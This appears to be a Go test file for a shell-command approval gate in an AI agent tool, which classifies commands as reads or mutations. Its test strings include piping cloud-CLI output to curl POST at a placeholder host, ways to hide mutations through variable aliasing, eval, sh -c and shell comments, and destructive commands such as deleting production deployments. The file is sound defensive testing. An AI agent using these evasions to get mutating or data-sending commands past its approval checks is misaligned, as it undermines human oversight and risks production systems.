			wrappable, ok := tool.(core.ShellWrappable)
			if !ok {
				return
			}
			wrappableCount++
			assert.NotPanics(t, func() {
				prefixes := wrappable.ShellCommandPrefixes()
				assert.NotEmpty(t, prefixes, "%q implements ShellWrappable but returned zero prefixes — either drop the interface or declare at least one prefix", name)
			}, "ShellCommandPrefixes for %q must not panic", name)
		})
	})
	// Sanity checks: silent 0-visit / 0-wrappable would defeat the purpose of
	// moving this test out of tools/core.
	assert.Greater(t, visited, 0, "no system-tool factories visited — registry is empty; is this test in the wrong package?")
	assert.Greater(t, wrappableCount, 0, "no ShellWrappable tools found — the registry has factories but none implement ShellWrappable; the whole gate is inert")
}

// TestIsEnvAssignment is a light coverage check for the identifier-name rule
// used by extractLeadingShellCommand. Reuses the shared implementation in
// shell_suspicious.go — same rule as the suspicious-command detector.
func TestIsEnvAssignment(t *testing.T) {
	cases := []struct {
		tok  string
		want bool
	}{
		{"FOO=bar", true},
		{"F=", true},
		{"F_OO=bar", true},
		{"F00=bar", true},
		{"a1=x", true},
		// Not env-var assignments:
		{"kubectl", false},      // no `=`
		{"=value", false},       // empty name
		{"1FOO=bar", false},     // starts with digit
		{"FOO", false},          // no `=`
		{"/path/=x", false},     // path prefix (has `/`)
		{"--flag=value", false}, // starts with `-`
		{"FOO.bar=baz", false},  // `.` isn't identifier
		{"", false},             // empty
	}
	for _, tc := range cases {
		t.Run(tc.tok, func(t *testing.T) {
			assert.Equal(t, tc.want, isEnvAssignment(tc.tok))
		})
	}
}

// Regression: a read in the first stage must not hide an HTTP mutation.
func TestShellTool_PipelineHTTPMutationIsGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	for _, prefix := range []string{"kubectl get pods -o json", "aws ec2 describe-instances", "az vm list", "gcloud compute instances list"} {
		for _, tail := range []string{
			"curl -X POST https://example.invalid --data-binary @-",
			"env MODE=test /usr/bin/curl --json @- https://example.invalid",
			"curl --data-urlencode content@- https://example.invalid",
			"curl -sSXPOST https://example.invalid",
			"curl -sK- https://example.invalid",
			"curl -QDELE https://example.invalid/file",
		} {
			for _, suffix := range []string{"", "; echo done", " > result.txt"} {
				input := prefix + " | " + tail + suffix
				requireShellMutationGuard(t, tool, input)
			}
		}
	}
}

func TestContainsPotentialMutatingCurlDoesNotLeakAcrossCommands(t *testing.T) {
	assert.False(t, containsPotentialMutatingCurl("curl -s https://example.invalid; echo --data payload"))
	assert.False(t, containsPotentialMutatingCurl("curl -s https://example.invalid | jq --arg data payload"))
	assert.True(t, containsPotentialMutatingCurl("curl -s -X POST https://example.invalid"))
	assert.True(t, containsPotentialMutatingCurl("c=curl; $c --data payload https://example.invalid"))
	assert.True(t, containsPotentialMutatingCurl(`c="curl"; $c --data payload https://example.invalid`))
	assert.True(t, containsPotentialMutatingCurl(`c='curl'; $c --data payload https://example.invalid`))
	assert.True(t, containsPotentialMutatingCurl(`c="curl -s"; $c --data payload https://example.invalid`))
	assert.True(t, containsPotentialMutatingCurl("c=curl; ${c} --data payload https://example.invalid"))
	assert.True(t, containsPotentialMutatingCurl("sh -c 'curl;-X POST https://example.invalid'"))
	assert.True(t, containsPotentialMutatingCurl("c=curl; false && c=echo; $c -X POST https://example.invalid"))
	assert.True(t, containsPotentialMutatingCurl(`x=-X; curl "$x" POST https://example.invalid`))
	assert.False(t, containsPotentialMutatingCurl(`curl 'https://api.example/items?$filter=status'`))
	assert.False(t, containsPotentialMutatingCurl(`curl -H 'X-Cost: $5' https://api.example/items`))
	assert.False(t, containsPotentialMutatingCurl("c=curl; echo c --data payload"))
	assert.False(t, containsPotentialMutatingCurl("echo curl -X POST"))
	assert.False(t, containsPotentialMutatingCurl(`c=curl; echo "$c" --data payload`))
	assert.False(t, containsPotentialMutatingCurl("curl -sS -o/tmp/data.json https://example.invalid"))
	assert.False(t, containsPotentialMutatingCurl("curl -HAuthorization:data https://example.invalid"))
	assert.False(t, containsPotentialMutatingCurl("curl -w%{json} https://example.invalid"))
	assert.True(t, containsPotentialMutatingCurl("curl -sSXPOST https://example.invalid"))
	assert.True(t, containsPotentialMutatingCurl("curl -QDELE https://example.invalid/file"))
}

func TestShellTool_CommentsDoNotExecuteMutations(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	for _, input := range []string{
		"kubectl get pods # && kubectl delete deployment prod",
		"aws ec2 describe-instances # ; aws ec2 terminate-instances --instance-ids i-prod",
	} {
		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
		require.NoError(t, err)
		assert.Equal(t, core.ToolRequestTypeRead, got, input)
	}
	got, err := tool.InferToolRequestType(nil, "shell_execute", "curl -s https://example.invalid # -X DELETE")
	require.NoError(t, err)
	assert.NotEqual(t, core.ToolRequestTypeUpdate, got)
	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", "curl -s https://example.invalid # -X DELETE")
	require.NoError(t, err)
	assert.Empty(t, prompt)

	requireShellMutationGuard(t, tool, "kubectl get pods # ignored\nkubectl delete deployment prod")
}

func TestStripShellComments(t *testing.T) {
	assert.Equal(t, "kubectl get pods ", stripShellComments("kubectl get pods # kubectl delete pods"))
	assert.Equal(t, "echo ok \nkubectl get pods", stripShellComments("echo ok # comment\nkubectl get pods"))
	assert.Equal(t, `curl https://example.invalid/#anchor`, stripShellComments(`curl https://example.invalid/#anchor`))
	assert.Equal(t, `echo 'literal # value' \#tag ${#items[@]}`, stripShellComments(`echo 'literal # value' \#tag ${#items[@]}`))
}

func TestShellTool_KubectlReadSubcommands(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	for _, input := range []string{
		"kubectl config current-context; kubectl config get-contexts",
		"kubectl rollout history deployment/api | head -20",
		"kubectl auth can-i update deployments && kubectl auth can-i patch pods",
	} {
		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
		require.NoError(t, err)
		assert.Equal(t, core.ToolRequestTypeRead, got, input)
	}
	for _, input := range []string{
		"kubectl config current-context; kubectl config set-context prod",
		"kubectl rollout status deployment/api && kubectl rollout restart deployment/api",
		"kubectl auth can-i update deployments && kubectl auth reconcile -f roles.yaml",
	} {
		requireShellMutationGuard(t, tool, input)
	}
}

func TestShellTool_ComplexCommandsUseWholeShellPrompt(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"for r in us-east-1 us-west-2; do echo $r; aws cloudwatch get-metric-data --region $r --start-time 2026-08-27T11:15:00Z --end-time 2026-08-27T11:35:00Z --metric-data-queries '[]' > /tmp/metrics_$r.json 2>&1; head /tmp/metrics_$r.json; done",
		`for ns in nudgebee-agent-dev nudgebee-agent-prod; do
echo "=== NS: $ns ==="
kubectl logs -n $ns -l app=runner --tail=30 --since=2h || kubectl logs -n $ns $(kubectl get pods -n $ns -o jsonpath='{.items[0].metadata.name}') --tail=30 --since=2h
done
kubectl logs -n nudgebee -l app=relay-server --tail=30 --since=1h`,
		"kubectl get pods | grep -q foo && curl -X POST https://example.invalid",
		"kubectl get pods | curl -G --data-urlencode q=pods https://example.invalid/search",
		"kubectl get pods | curl -sXGET https://example.invalid/search",
		"curl --data-urlencode query=up https://prometheus.invalid/api/v1/query",
		"if true; then curl -X POST https://example.invalid; fi",
		"for x in one; do curl -X POST https://example.invalid; done",
		"sh -c 'curl -X POST https://example.invalid'",
		"eval 'curl -X DELETE https://example.invalid'",
		"c=curl; $c -X POST https://example.invalid",
		`sh -c '\curl -X POST https://example.invalid'`,
		`sh -c '\kubectl delete pod prod'`,
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Empty(t, got, "ambiguous shell should defer instead of forcing approval")

			prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Equal(t, shellRequestTypePrompt, prompt,
				"the model must classify the complete shell program, not its first CLI stage")
		})
	}
}
